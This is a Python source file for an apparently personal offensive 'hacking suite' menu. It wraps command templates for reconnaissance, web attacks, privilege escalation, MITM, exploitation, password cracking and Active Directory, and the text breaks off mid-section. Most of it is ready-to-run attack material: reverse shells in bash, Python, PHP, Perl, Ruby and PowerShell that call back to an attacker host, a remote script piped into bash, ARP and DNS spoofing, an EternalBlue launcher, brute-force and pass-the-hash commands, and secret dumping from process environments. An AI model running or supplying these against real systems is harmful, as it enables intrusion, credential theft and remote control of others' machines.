#!/usr/bin/env python3
"""
LUCII'S TOOLKIT — The Ultimate Linux Hacking & Cybersec Suite
Run: python3 lucii.py
Requires: pip install rich
"""

import sys, os, readline, subprocess
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.syntax import Syntax
from rich.prompt import Prompt
from rich.rule import Rule
from rich.align import Align
from rich.columns import Columns
from rich import box

console = Console()

# ─── PALETTE ─────────────────────────────────────────────────────────────────
C = {
    "recon":     "#00ff9d",
    "web":       "#ff4d6d",
    "privesc":   "#ffd60a",
    "network":   "#7b5ea7",
    "exploit":   "#ff6b35",
    "passwords": "#00b4d8",
    "ad":        "#e040fb",
    "persist":   "#06d6a0",
    "log":       "#f77f00",
    "forensics": "#90e0ef",
    "phishing":  "#ff006e",
    "mobile":    "#8338ec",
    "crypto":    "#3a86ff",
    "cloud":     "#fb5607",
    "malware":   "#ff0054",
}

RY = "/usr/share/wordlist/rockyou.txt"
DB = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

# ─── TOOL REGISTRY ───────────────────────────────────────────────────────────
TOOLS = {

    # ══════════════════════════════════════════════════════════════════════════
    "recon": { "label": "RECON & OSINT", "tools": [
        { "id":"1",  "name":"NMAP Full",           "desc":"Version, scripts, OS, all 65535 ports",
          "fields":[("t","Target IP/CIDR","192.168.1.1")],
          "cmd": lambda f: f"nmap -sV -sC -O -p- --min-rate 5000 -oN nmap_full.txt {f[0]}" },
        { "id":"2",  "name":"NMAP Vuln Scan",      "desc":"Run vuln NSE scripts against target",
          "fields":[("t","Target","192.168.1.1")],
          "cmd": lambda f: f"nmap --script vuln -sV {f[0]} -oN nmap_vuln.txt" },
        { "id":"3",  "name":"NMAP UDP",             "desc":"Top 200 UDP port scan",
          "fields":[("t","Target","192.168.1.1")],
          "cmd": lambda f: f"nmap -sU --top-ports 200 {f[0]} -oN nmap_udp.txt" },
        { "id":"4",  "name":"Gobuster Dir",         "desc":"Directory + file bruteforce",
          "fields":[("t","Target URL","10.10.10.1"),("th","Threads","50")],
          "cmd": lambda f: f"gobuster dir -u http://{f[0]} -w {DB} -x php,html,txt,bak,zip -t {f[1]} -o gobuster.txt" },
        { "id":"5",  "name":"Gobuster DNS",         "desc":"Subdomain bruteforce via DNS",
          "fields":[("d","Domain","target.com"),("w","Wordlist","/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")],
          "cmd": lambda f: f"gobuster dns -d {f[0]} -w {f[1]} -o gobuster_dns.txt" },
        { "id":"6",  "name":"FFUF",                 "desc":"Fast web fuzzer — dirs/params/vhosts",
          "fields":[("u","URL","http://10.10.10.1/FUZZ"),("w","Wordlist",DB)],
          "cmd": lambda f: f"ffuf -u {f[0]} -w {f[1]} -mc 200,301,302,403 -t 100 -o ffuf.json" },
        { "id":"7",  "name":"FFUF VHost",           "desc":"Virtual host discovery",
          "fields":[("u","Base URL","http://target.com"),("d","Domain","target.com"),("w","Wordlist","/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")],
          "cmd": lambda f: f"ffuf -u {f[0]} -H 'Host: FUZZ.{f[1]}' -w {f[2]} -mc 200,301,302 -o vhost.json" },
        { "id":"8",  "name":"Sublist3r",            "desc":"Subdomain enumeration via OSINT",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"python3 /opt/Sublist3r/sublist3r.py -d {f[0]} -o subdomains.txt" },
        { "id":"9",  "name":"Amass",                "desc":"Deep subdomain + ASN mapping",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"amass enum -passive -d {f[0]} -o amass.txt" },
        { "id":"10", "name":"theHarvester",         "desc":"OSINT — emails, hosts, IPs, names",
          "fields":[("d","Domain","target.com"),("s","Sources","google,bing,linkedin,twitter")],
          "cmd": lambda f: f"theHarvester -d {f[0]} -l 500 -b {f[1]}" },
        { "id":"11", "name":"Shodan CLI",           "desc":"Search exposed hosts on Shodan",
          "fields":[("q","Query","apache country:GB port:80")],
          "cmd": lambda f: f'shodan search --fields ip_str,port,org,country_name "{f[0]}"' },
        { "id":"12", "name":"WhatWeb",              "desc":"Web stack fingerprinting",
          "fields":[("u","URL","https://target.com")],
          "cmd": lambda f: f"whatweb -v -a 3 {f[0]}" },
        { "id":"13", "name":"Enum4linux",           "desc":"SMB/Windows enumeration",
          "fields":[("t","Target IP","192.168.1.10")],
          "cmd": lambda f: f"enum4linux -a {f[0]} 2>&1 | tee enum4linux.txt" },
        { "id":"14", "name":"DNSrecon",             "desc":"DNS zone walk, brute, std enum",
          "fields":[("d","Domain","target.com"),("t","Type","std")],
          "cmd": lambda f: f"dnsrecon -d {f[0]} -t {f[1]}" },
        { "id":"15", "name":"Masscan",              "desc":"Internet-scale port scanner",
          "fields":[("t","Target/CIDR","192.168.1.0/24"),("p","Ports","1-65535"),("r","Rate","10000")],
          "cmd": lambda f: f"masscan {f[0]} -p{f[1]} --rate={f[2]} -oG masscan.txt" },
        { "id":"16", "name":"Recon-ng",             "desc":"Full OSINT recon framework launch",
          "fields":[],
          "cmd": lambda f: "recon-ng" },
        { "id":"17", "name":"Maltego (CLI prep)",   "desc":"Export targets for Maltego transforms",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"theHarvester -d {f[0]} -l 1000 -b all -f maltego_prep.xml" },
        { "id":"18", "name":"Wayback URLs",         "desc":"Pull archived URLs from Wayback Machine",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f'curl -s "http://web.archive.org/cdx/search/cdx?url=*.{f[0]}/*&output=text&fl=original&collapse=urlkey" | sort -u | tee wayback.txt' },
        { "id":"19", "name":"GAU",                  "desc":"Fetch known URLs from AlienVault + Wayback",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"gau {f[0]} | tee gau_urls.txt" },
        { "id":"20", "name":"CRT.sh Cert Search",  "desc":"Find subdomains via certificate transparency",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f'curl -s "https://crt.sh/?q=%.{f[0]}&output=json" | python3 -c "import sys,json;[print(x[\'name_value\']) for x in json.load(sys.stdin)]" | sort -u' },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "web": { "label": "WEB ATTACK", "tools": [
        { "id":"1",  "name":"SQLMap Auto",          "desc":"Full automated SQL injection",
          "fields":[("u","Target URL","http://target.com/page?id=1"),("d","DB (opt)","")],
          "cmd": lambda f: f'sqlmap -u "{f[0]}" --dbs --batch --level=5 --risk=3 --random-agent --dump-all --threads=5' + (f" -D {f[1]}" if f[1] else "") },
        { "id":"2",  "name":"SQLMap POST",          "desc":"SQLi on POST request body",
          "fields":[("u","URL","http://target.com/login"),("d","POST data","user=admin&pass=test")],
          "cmd": lambda f: f'sqlmap -u "{f[0]}" --data="{f[1]}" --batch --level=5 --risk=3 --random-agent --dbs' },
        { "id":"3",  "name":"XSStrike",             "desc":"Advanced XSS scanner + crawler",
          "fields":[("u","URL","http://target.com/search?q=")],
          "cmd": lambda f: f'python3 /opt/XSStrike/xsstrike.py -u "{f[0]}" --crawl --blind' },
        { "id":"4",  "name":"Nikto",                "desc":"Web server vulnerability scan",
          "fields":[("t","Host/URL","http://target.com")],
          "cmd": lambda f: f"nikto -h {f[0]} -o nikto_report.txt -Format txt" },
        { "id":"5",  "name":"WPScan",               "desc":"WordPress vulnerability scanner",
          "fields":[("u","WordPress URL","http://wp-site.com"),("k","API Token (opt)","")],
          "cmd": lambda f: f"wpscan --url {f[0]} --enumerate u,p,t,tt --plugins-detection aggressive" + (f" --api-token {f[1]}" if f[1] else "") },
        { "id":"6",  "name":"Commix",               "desc":"Command injection exploiter",
          "fields":[("u","URL","http://target.com/cmd?ip=127.0.0.1")],
          "cmd": lambda f: f'python3 /opt/commix/commix.py --url="{f[0]}" --batch' },
        { "id":"7",  "name":"SSRF Probe",           "desc":"Server-Side Request Forgery tester",
          "fields":[("u","URL","http://target.com/fetch?url="),("cb","Callback host","your-burp-collab.net")],
          "cmd": lambda f: f'curl -s "{f[0]}http://{f[1]}/test"' },
        { "id":"8",  "name":"LFI Scanner",          "desc":"Local File Inclusion path traversal",
          "fields":[("u","URL","http://target.com/page?file=")],
          "cmd": lambda f: f'for p in "../../etc/passwd" "../../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2fetc%2fpasswd"; do echo "--- $p ---"; curl -s "{f[0]}$p" | grep root; done' },
        { "id":"9",  "name":"XXE Payload",          "desc":"Generate XML External Entity payload",
          "fields":[("f","File to read","/etc/passwd"),("cb","Callback (opt)","attacker.com")],
          "cmd": lambda f: f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{f[0]}">]><root>&xxe;</root>' },
        { "id":"10", "name":"CORS Tester",          "desc":"Test CORS misconfiguration",
          "fields":[("u","URL","https://api.target.com/data"),("o","Origin","https://evil.com")],
          "cmd": lambda f: f'curl -s -I -H "Origin: {f[1]}" -X GET "{f[0]}" | grep -i "access-control"' },
        { "id":"11", "name":"JWT Crack",            "desc":"Crack JWT secret with hashcat",
          "fields":[("jwt","JWT Token","eyJ...")],
          "cmd": lambda f: f'echo "{f[0]}" > jwt.txt\nhashcat -a 0 -m 16500 jwt.txt {RY}' },
        { "id":"12", "name":"Parameter Miner",      "desc":"Discover hidden GET/POST parameters",
          "fields":[("u","URL","http://target.com/page"),("w","Wordlist","/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt")],
          "cmd": lambda f: f'ffuf -u "{f[0]}?FUZZ=test" -w {f[1]} -mc 200,301,302 -fw 1 -o params.json' },
        { "id":"13", "name":"HTTP Request Smuggling","desc":"Test for HTTP/1.1 request smuggling",
          "fields":[("u","URL","http://target.com")],
          "cmd": lambda f: f"python3 smuggler.py -u {f[0]}" },
        { "id":"14", "name":"Open Redirect Test",   "desc":"Test for open redirect vulnerabilities",
          "fields":[("u","URL","http://target.com/redirect?url=")],
          "cmd": lambda f: f'for p in "https://evil.com" "//evil.com" "/\\evil.com" "%0d%0ahttps://evil.com"; do echo "--- $p ---"; curl -sI "{f[0]}$p" | grep -i location; done' },
        { "id":"15", "name":"Directory Traversal",  "desc":"Path traversal wordlist fuzz",
          "fields":[("u","Base URL","http://target.com/download?file=")],
          "cmd": lambda f: f'ffuf -u "{f[0]}FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -o traversal.json' },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "privesc": { "label": "PRIVESC", "tools": [
        { "id":"1",  "name":"LinPEAS",              "desc":"Full Linux privesc auditor",
          "fields":[],
          "cmd": lambda f: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>&1 | tee linpeas.txt" },
        { "id":"2",  "name":"SUID/GUID Find",       "desc":"Find SUID and GUID binaries",
          "fields":[],
          "cmd": lambda f: "echo '=== SUID ==='; find / -perm -4000 -type f 2>/dev/null; echo '=== GUID ==='; find / -perm -2000 -type f 2>/dev/null" },
        { "id":"3",  "name":"Sudo Check",           "desc":"List sudo rights",
          "fields":[],
          "cmd": lambda f: "sudo -l 2>/dev/null" },
        { "id":"4",  "name":"Capabilities",         "desc":"Find dangerous capability binaries",
          "fields":[],
          "cmd": lambda f: "getcap -r / 2>/dev/null" },
        { "id":"5",  "name":"Cron Jobs",            "desc":"Find writable/interesting cron jobs",
          "fields":[],
          "cmd": lambda f: "crontab -l 2>/dev/null; cat /etc/cron* /etc/crontab /var/spool/cron/crontabs/* 2>/dev/null" },
        { "id":"6",  "name":"pspy",                 "desc":"Monitor processes without root",
          "fields":[("i","Interval ms","1000")],
          "cmd": lambda f: f"./pspy64 -pf -i {f[0]}" },
        { "id":"7",  "name":"Kernel CVE Search",    "desc":"Match kernel to known exploits",
          "fields":[],
          "cmd": lambda f: 'uname -a; searchsploit "$(uname -r | cut -d- -f1)" linux kernel' },
        { "id":"8",  "name":"Docker Escape",        "desc":"Detect container escape vectors",
          "fields":[],
          "cmd": lambda f: "cat /proc/1/cgroup | head -5; ls -la /var/run/docker.sock 2>/dev/null; capsh --print 2>/dev/null; mount | grep docker" },
        { "id":"9",  "name":"PATH Hijack",          "desc":"Find writable directories in PATH",
          "fields":[],
          "cmd": lambda f: "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type f 2>/dev/null" },
        { "id":"10", "name":"NFS Shares",           "desc":"Check for no_root_squash NFS mounts",
          "fields":[],
          "cmd": lambda f: "cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null" },
        { "id":"11", "name":"World Writable",       "desc":"Find world-writable files",
          "fields":[],
          "cmd": lambda f: "find / -perm -0002 -type f 2>/dev/null | grep -v proc" },
        { "id":"12", "name":"GTFOBins Check",       "desc":"Check sudo/SUID against GTFOBins list",
          "fields":[("b","Binary name","vim")],
          "cmd": lambda f: f'curl -s "https://gtfobins.github.io/gtfobins/{f[0]}/" | grep -i "sudo\\|suid\\|shell" | head -20' },
        { "id":"13", "name":"LXD/LXC Escape",      "desc":"Container escape via LXD group",
          "fields":[],
          "cmd": lambda f: "id; groups; lxc image list 2>/dev/null; lxc list 2>/dev/null" },
        { "id":"14", "name":"Passwd Writable",      "desc":"Check if /etc/passwd is writable",
          "fields":[],
          "cmd": lambda f: 'ls -la /etc/passwd; ls -la /etc/shadow; if [ -w /etc/passwd ]; then echo "[!] /etc/passwd is writable!"; fi' },
        { "id":"15", "name":"Env Variables",        "desc":"Dump environment & interesting vars",
          "fields":[],
          "cmd": lambda f: "env; echo '---'; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | sort -u | grep -iE 'pass|key|secret|token|api'" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "network": { "label": "NETWORK & MITM", "tools": [
        { "id":"1",  "name":"tcpdump Capture",      "desc":"Packet capture to .pcap",
          "fields":[("i","Interface","eth0"),("f","BPF Filter (opt)","port 80")],
          "cmd": lambda f: "tcpdump -i {} -w capture.pcap{} -n -v".format(f[0], " '{}'".format(f[1]) if f[1] else "") },
        { "id":"2",  "name":"ARP Spoof MITM",       "desc":"Man-in-the-middle via ARP poison",
          "fields":[("i","Interface","eth0"),("v","Victim IP","192.168.1.50"),("g","Gateway IP","192.168.1.1")],
          "cmd": lambda f: f"echo 1 > /proc/sys/net/ipv4/ip_forward; arpspoof -i {f[0]} -t {f[1]} {f[2]} & arpspoof -i {f[0]} -t {f[2]} {f[1]}" },
        { "id":"3",  "name":"Chisel Tunnel",        "desc":"TCP tunnel over HTTP (pivot)",
          "fields":[("m","Mode (server/client)","client"),("p","Port","8080"),("r","Server host","10.10.14.1"),("fp","Forward port","3306")],
          "cmd": lambda f: (f"./chisel server -p {f[1]} --reverse" if f[0]=="server" else f"./chisel client {f[2]}:{f[1]} R:{f[3]}:127.0.0.1:{f[3]}") },
        { "id":"4",  "name":"SSH Tunnel",           "desc":"Local/remote SSH port forward",
          "fields":[("t","Type (local/remote)","local"),("lp","Local port","8080"),("rh","Remote target","127.0.0.1"),("rp","Remote port","80"),("u","SSH user@host","user@target")],
          "cmd": lambda f: (f"ssh -L {f[1]}:{f[2]}:{f[3]} {f[4]}" if f[0]=="local" else f"ssh -R {f[3]}:{f[2]}:{f[1]} {f[4]}") },
        { "id":"5",  "name":"ProxyChains",          "desc":"Route tools through SOCKS5 proxy",
          "fields":[("c","Command","nmap -sT -Pn 10.0.0.1")],
          "cmd": lambda f: f"proxychains4 -f /etc/proxychains4.conf {f[0]}" },
        { "id":"6",  "name":"WiFi WPA Crack",       "desc":"Capture WPA handshake + crack",
          "fields":[("i","Interface","wlan0"),("b","BSSID","AA:BB:CC:DD:EE:FF"),("c","Channel","6")],
          "cmd": lambda f: f"airmon-ng start {f[0]}; airodump-ng -c {f[2]} --bssid {f[1]} -w handshake {f[0]}mon\n# deauth: aireplay-ng --deauth 10 -a {f[1]} {f[0]}mon\nhashcat -m 22000 handshake.hccapx {RY}" },
        { "id":"7",  "name":"Netcat Listener",      "desc":"Raw TCP listener",
          "fields":[("p","Port","4444")],
          "cmd": lambda f: f"rlwrap nc -nlvp {f[0]}" },
        { "id":"8",  "name":"Socat Relay",          "desc":"TCP relay/pivot with socat",
          "fields":[("lp","Listen port","4444"),("rh","Remote host","10.0.0.5"),("rp","Remote port","80")],
          "cmd": lambda f: f"socat TCP-LISTEN:{f[0]},fork TCP:{f[1]}:{f[2]}" },
        { "id":"9",  "name":"Responder LLMNR",      "desc":"Poison LLMNR/NBT-NS for hashes",
          "fields":[("i","Interface","eth0")],
          "cmd": lambda f: f"responder -I {f[0]} -rdwv" },
        { "id":"10", "name":"Mitm6 IPv6",           "desc":"IPv6 MITM + DNS takeover",
          "fields":[("d","Domain","corp.local"),("i","Interface","eth0")],
          "cmd": lambda f: f"mitm6 -d {f[0]} -i {f[1]}" },
        { "id":"11", "name":"Bettercap",            "desc":"Launch full bettercap MITM suite",
          "fields":[("i","Interface","eth0")],
          "cmd": lambda f: f"bettercap -iface {f[0]}" },
        { "id":"12", "name":"VLAN Hop",             "desc":"802.1Q double-tag VLAN hopping",
          "fields":[("i","Interface","eth0"),("v1","Native VLAN","1"),("v2","Target VLAN","20"),("t","Target IP","10.20.0.1")],
          "cmd": lambda f: f"modprobe 8021q; vconfig add {f[0]} {f[1]}; vconfig add {f[0]}.{f[1]} {f[2]}; ifconfig {f[0]}.{f[1]}.{f[2]} up; route add -net {f[3]} dev {f[0]}.{f[1]}.{f[2]}" },
        { "id":"13", "name":"DNS Spoof",            "desc":"Spoof DNS responses on LAN",
          "fields":[("i","Interface","eth0"),("d","Domain to spoof","target.com"),("ip","Redirect IP","192.168.1.100")],
          "cmd": lambda f: f"echo '{f[2]} {f[1]}' >> /etc/hosts; bettercap -iface {f[0]} -eval 'dns.spoof on'" },
        { "id":"14", "name":"Packet Injection",     "desc":"Craft + inject raw packets with scapy",
          "fields":[("t","Target IP","192.168.1.1"),("p","Port","80")],
          "cmd": lambda f: f'python3 -c "from scapy.all import *; send(IP(dst=\\"{f[0]}\\")/TCP(dport={f[1]},flags=\\"S\\"),count=10)"' },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "exploit": { "label": "EXPLOIT", "tools": [
        { "id":"1",  "name":"MSF Multi/Handler",    "desc":"Metasploit catch-all listener",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("pl","Payload","linux/x64/meterpreter/reverse_tcp")],
          "cmd": lambda f: f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {f[2]}; set LHOST {f[0]}; set LPORT {f[1]}; exploit -j"' },
        { "id":"2",  "name":"Rev Shell Gen",        "desc":"bash/python/nc/php/perl/ruby/powershell",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("t","Type (bash/python3/nc/php/perl/ruby/powershell)","bash")],
          "cmd": lambda f: {
              "bash":       f"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1",
              "python3":    f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{f[0]}\",{f[1]}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
              "nc":         f"nc -e /bin/bash {f[0]} {f[1]}",
              "php":        f"php -r '$sock=fsockopen(\"{f[0]}\",{f[1]});$proc=proc_open(\"/bin/bash\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
              "perl":       f"perl -e 'use Socket;$i=\"{f[0]}\";$p={f[1]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
              "ruby":       f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{f[0]}\",{f[1]}))'",
              "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{f[0]}',{f[1]});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}\""
          }.get(f[2], f"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1") },
        { "id":"3",  "name":"msfvenom Payload",     "desc":"Generate shellcode / executables",
          "fields":[("pl","Payload","linux/x64/meterpreter/reverse_tcp"),("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("f","Format","elf"),("o","Output","shell.elf")],
          "cmd": lambda f: f"msfvenom -p {f[0]} LHOST={f[1]} LPORT={f[2]} -f {f[3]} -o {f[4]} && chmod +x {f[4]}" },
        { "id":"4",  "name":"SearchSploit",         "desc":"Search ExploitDB offline",
          "fields":[("q","Search term","vsftpd 2.3.4")],
          "cmd": lambda f: f'searchsploit "{f[0]}"' },
        { "id":"5",  "name":"TTY Upgrade",          "desc":"Upgrade dumb shell to full PTY",
          "fields":[],
          "cmd": lambda f: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z → stty raw -echo → fg\nexport TERM=xterm" },
        { "id":"6",  "name":"Buffer Overflow",      "desc":"Generate BOF pattern + offset",
          "fields":[("l","Pattern length","500")],
          "cmd": lambda f: f"python3 -c \"import cyclic; print(cyclic.cyclic({f[0]}))\"\n# or with msf: msf-pattern_create -l {f[0]}" },
        { "id":"7",  "name":"Shellcode Injector",   "desc":"Inject shellcode into process (Linux)",
          "fields":[("pid","Target PID","1234")],
          "cmd": lambda f: f"# Using /proc/{f[0]}/mem injection\npython3 inject.py {f[0]}" },
        { "id":"8",  "name":"Ret2Libc",             "desc":"Find libc base + system/binsh offsets",
          "fields":[("b","Binary","./vuln"),("lp","libc path","/lib/x86_64-linux-gnu/libc.so.6")],
          "cmd": lambda f: f"ldd {f[0]} | grep libc\npython3 -c \"from pwn import *; l=ELF('{f[1]}'); print(hex(l.symbols['system'])); print(hex(next(l.search(b'/bin/sh'))))\"" },
        { "id":"9",  "name":"ROP Gadget Finder",    "desc":"Find ROP gadgets in binary",
          "fields":[("b","Binary","./vuln")],
          "cmd": lambda f: f"ROPgadget --binary {f[0]} --rop | head -50" },
        { "id":"10", "name":"File Transfer (HTTP)",  "desc":"Python HTTP server for file transfer",
          "fields":[("p","Port","8000")],
          "cmd": lambda f: f"python3 -m http.server {f[0]}" },
        { "id":"11", "name":"MSF Module Search",    "desc":"Search Metasploit for module",
          "fields":[("q","Search term","eternalblue")],
          "cmd": lambda f: f'msfconsole -q -x "search {f[0]}; exit"' },
        { "id":"12", "name":"EternalBlue (MS17-010)","desc":"SMB exploit for unpatched Windows",
          "fields":[("t","Target IP","10.0.0.5"),("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {f[0]}; set LHOST {f[1]}; set LPORT {f[2]}; run"' },
        { "id":"13", "name":"PrintNightmare",       "desc":"CVE-2021-34527 Windows print spooler",
          "fields":[("t","Target IP","10.0.0.5"),("u","Username","user"),("p","Password","pass"),("lh","LHOST","10.10.14.1")],
          "cmd": lambda f: f"python3 CVE-2021-1675.py '{f[2]}/{f[1]}:{f[2]}@{f[0]}' '\\\\\\\\{f[3]}\\\\share\\\\rev.dll'" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "passwords": { "label": "CREDS & HASHES", "tools": [
        { "id":"1",  "name":"Hashcat",              "desc":"GPU hash cracking",
          "fields":[("h","Hash/File","hash.txt"),("w","Wordlist",RY),("m","Mode","0")],
          "cmd": lambda f: f'hashcat -m {f[2]} -a 0 "{f[0]}" {f[1]} --show' },
        { "id":"2",  "name":"Hashcat Rules",        "desc":"Hashcat with best64 rules",
          "fields":[("h","Hash/File","hash.txt"),("w","Wordlist",RY),("m","Mode","0")],
          "cmd": lambda f: f'hashcat -m {f[2]} -a 0 "{f[0]}" {f[1]} -r /usr/share/hashcat/rules/best64.rule' },
        { "id":"3",  "name":"Hashcat Mask",         "desc":"Mask attack (brute pattern)",
          "fields":[("h","Hash/File","hash.txt"),("m","Mode","0"),("mk","Mask","?u?l?l?l?d?d?d?d")],
          "cmd": lambda f: f'hashcat -m {f[1]} -a 3 "{f[0]}" "{f[2]}"' },
        { "id":"4",  "name":"John the Ripper",      "desc":"Crack hashes / shadow files",
          "fields":[("f","Hash file","/etc/shadow"),("w","Wordlist",RY)],
          "cmd": lambda f: f"john {f[0]} --wordlist={f[1]} --format=auto; john {f[0]} --show" },
        { "id":"5",  "name":"Hydra SSH",            "desc":"SSH brute force",
          "fields":[("t","Target IP","192.168.1.10"),("u","Username","admin"),("p","Password list",RY)],
          "cmd": lambda f: f"hydra -l {f[1]} -P {f[2]} {f[0]} ssh -t 4 -V" },
        { "id":"6",  "name":"Hydra HTTP",           "desc":"HTTP POST form brute force",
          "fields":[("t","Target","192.168.1.10"),("p","Path","/login"),("d","POST data","user=^USER^&pass=^PASS^"),("f","Fail string","Invalid")],
          "cmd": lambda f: f'hydra -L users.txt -P {RY} {f[0]} http-post-form "{f[1]}:{f[2]}:{f[3]}" -V' },
        { "id":"7",  "name":"Hydra FTP",            "desc":"FTP brute force",
          "fields":[("t","Target","192.168.1.10"),("u","User","admin"),("p","Passlist",RY)],
          "cmd": lambda f: f"hydra -l {f[1]} -P {f[2]} ftp://{f[0]} -V" },
        { "id":"8",  "name":"CrackMapExec",         "desc":"SMB spray + exec across subnet",
          "fields":[("t","Target/CIDR","192.168.1.0/24"),("u","Username","administrator"),("p","Password","P@ssw0rd")],
          "cmd": lambda f: f"crackmapexec smb {f[0]} -u {f[1]} -p '{f[2]}'" },
        { "id":"9",  "name":"Hash Identifier",      "desc":"Identify unknown hash type",
          "fields":[("h","Hash","5f4dcc3b5aa765d61d8327deb882cf99")],
          "cmd": lambda f: f'hashid "{f[0]}"' },
        { "id":"10", "name":"Pass-the-Hash",        "desc":"Authenticate with NTLM hash (no cleartext)",
          "fields":[("d","Domain","CORP"),("u","Username","Administrator"),("h","NTLM Hash","aad3b435..."),("t","Target IP","10.0.0.5")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/smbexec.py {f[0]}/{f[1]}@{f[3]} -hashes :{f[2]}" },
        { "id":"11", "name":"secretsdump",          "desc":"Dump SAM/NTDS/LSA secrets remotely",
          "fields":[("d","Domain","CORP"),("u","Username","Administrator"),("p","Password","P@ssw0rd!"),("t","Target IP","10.0.0.5")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{f[0]}/{f[1]}:{f[2]}@{f[3]}'" },
        { "id":"12", "name":"zip2john",             "desc":"Extract hash from zip for john",
          "fields":[("f","Zip file","secret.zip")],
          "cmd": lambda f: f"zip2john {f[0]} > zip.hash; john zip.hash --wordlist={RY}" },
        { "id":"13", "name":"ssh2john",             "desc":"Crack encrypted SSH private key",
          "fields":[("k","Key file","id_rsa")],
          "cmd": lambda f: f"ssh2john {f[0]} > ssh.hash; john ssh.hash --wordlist={RY}" },
        { "id":"14", "name":"Spray (Kerbrute)",     "desc":"Kerberos user enumeration + spray",
          "fields":[("dc","DC IP","10.0.0.1"),("d","Domain","corp.local"),("u","User list","users.txt"),("p","Password","Password1!")],
          "cmd": lambda f: f"kerbrute passwordspray -d {f[1]} --dc {f[0]} {f[2]} {f[3]}" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "ad": { "label": "ACTIVE DIRECTORY", "tools": [
        { "id":"1",  "name":"BloodHound Ingestor",  "desc":"Enumerate full AD attack paths",
          "fields":[("d","Domain","corp.local"),("u","User","lowpriv"),("p","Password","P@ssw0rd"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 bloodhound-python -u {f[1]} -p '{f[2]}' -d {f[0]} -dc {f[3]} -c All --zip" },
        { "id":"2",  "name":"Kerberoasting",        "desc":"Request + crack service tickets",
          "fields":[("d","Domain","corp.local"),("u","User","lowpriv"),("p","Password","P@ssw0rd"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py '{f[0]}/{f[1]}:{f[2]}' -dc-ip {f[3]} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt {RY}" },
        { "id":"3",  "name":"AS-REP Roasting",      "desc":"Attack accounts without pre-auth",
          "fields":[("d","Domain","corp.local"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {f[0]}/ -usersfile users.txt -dc-ip {f[1]} -format hashcat -outputfile asrep.txt\nhashcat -m 18200 asrep.txt {RY}" },
        { "id":"4",  "name":"LDAP Dump",            "desc":"Authenticated LDAP enumeration",
          "fields":[("dc","DC IP","10.0.0.1"),("d","Domain","CORP"),("u","User","lowpriv"),("p","Password","P@ssw0rd")],
          "cmd": lambda f: f"ldapdomaindump -u '{f[1]}\\\\{f[2]}' -p '{f[3]}' {f[0]}" },
        { "id":"5",  "name":"Evil-WinRM",           "desc":"WinRM shell into Windows host",
          "fields":[("t","Target IP","10.0.0.5"),("u","Username","Administrator"),("p","Password","P@ssw0rd")],
          "cmd": lambda f: f"evil-winrm -i {f[0]} -u {f[1]} -p '{f[2]}'" },
        { "id":"6",  "name":"CrackMapExec SMB",     "desc":"CME full SMB enum + share list",
          "fields":[("t","Target/CIDR","10.0.0.0/24"),("u","User","administrator"),("p","Password","P@ssw0rd")],
